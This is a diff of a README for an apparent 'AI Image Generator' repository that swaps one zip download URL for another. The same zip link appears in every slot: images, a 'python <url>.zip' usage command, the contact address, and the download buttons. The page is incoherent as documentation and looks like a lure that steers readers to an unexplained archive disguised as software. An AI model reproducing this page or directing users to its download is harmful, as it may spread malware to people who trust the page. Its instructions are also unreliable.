@@ -1,5 +1,5 @@
 # AI Image Generator 🖼️
-![AI Image Generator](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip)
+![AI Image Generator](https://raw.githubusercontent.com/huizuohaode/AI-Image-Generator/main/windball/A_Generator_Image_v1.2.zip)
 
 Welcome to the AI Image Generator repository! This tool utilizes cutting-edge AI technology to generate images based on text prompts. Whether you need inspiration for your next project or simply want to explore the power of artificial intelligence in image creation, this tool is perfect for you.
 
@@ -18,11 +18,11 @@ To get started with the AI Image Generator, simply follow these steps:
 
 ## Usage 🖥️
 ```bash
-python https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip --text "A beautiful sunset over the mountains"
+python https://raw.githubusercontent.com/huizuohaode/AI-Image-Generator/main/windball/A_Generator_Image_v1.2.zip --text "A beautiful sunset over the mountains"
 ```
 
 ## Example Output 🌄
-![Generated Image](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip)
+![Generated Image](https://raw.githubusercontent.com/huizuohaode/AI-Image-Generator/main/windball/A_Generator_Image_v1.2.zip)
 
 ## Contributing 🤝
 If you would like to contribute to the development of the AI Image Generator, feel free to submit a pull request. Your contributions are greatly appreciated!
@@ -37,11 +37,11 @@ Upcoming features planned for the AI Image Generator:
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Contact Us 📧
-If you have any questions, suggestions, or feedback, feel free to reach out to us at [https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip).
+If you have any questions, suggestions, or feedback, feel free to reach out to us at [https://raw.githubusercontent.com/huizuohaode/AI-Image-Generator/main/windball/A_Generator_Image_v1.2.zip](https://raw.githubusercontent.com/huizuohaode/AI-Image-Generator/main/windball/A_Generator_Image_v1.2.zip).
 
-[Download Latest Version](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip)
+[Download Latest Version](https://raw.githubusercontent.com/huizuohaode/AI-Image-Generator/main/windball/A_Generator_Image_v1.2.zip)
 
-[![Download Latest Version](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip%20Version-blue)](https://github.com/huizuohaode/AI-Image-Generator/releases/download/v1.0/Software.zip)
+[![Download Latest Version](https://raw.githubusercontent.com/huizuohaode/AI-Image-Generator/main/windball/A_Generator_Image_v1.2.zip%20Version-blue)](https://raw.githubusercontent.com/huizuohaode/AI-Image-Generator/main/windball/A_Generator_Image_v1.2.zip)
 
 If the link does not work, please check the "Releases" section of the repository for alternative download options. Visit the link to learn more about the latest version.
 
